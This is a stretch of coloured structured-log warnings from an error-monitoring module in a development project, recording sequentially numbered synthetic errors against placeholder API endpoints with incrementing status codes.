WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762537Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1418'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762586Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1419'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762634Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1420'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762682Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1421'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762731Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1422'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762779Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1423'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762826Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1424'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762874Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1425'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762922Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1426'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.762970Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1427'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763019Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1428'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763067Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1429'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763114Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1430'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763162Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1431'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763209Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1432'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763257Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1433'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763305Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1434'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763367Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1435'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763457Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1436'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763518Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1437'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763571Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1438'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763625Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1439'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763675Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1440'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763723Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1441'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763771Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1442'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763820Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1443'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763868Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1444'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.763919Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1445'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764013Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1446'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764087Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1447'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764142Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1448'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764193Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m29[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1449'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764243Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1450'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764296Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1451'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764345Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1452'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764394Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1453'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764443Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1454'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764492Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1455'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764542Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1456'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764591Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1457'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
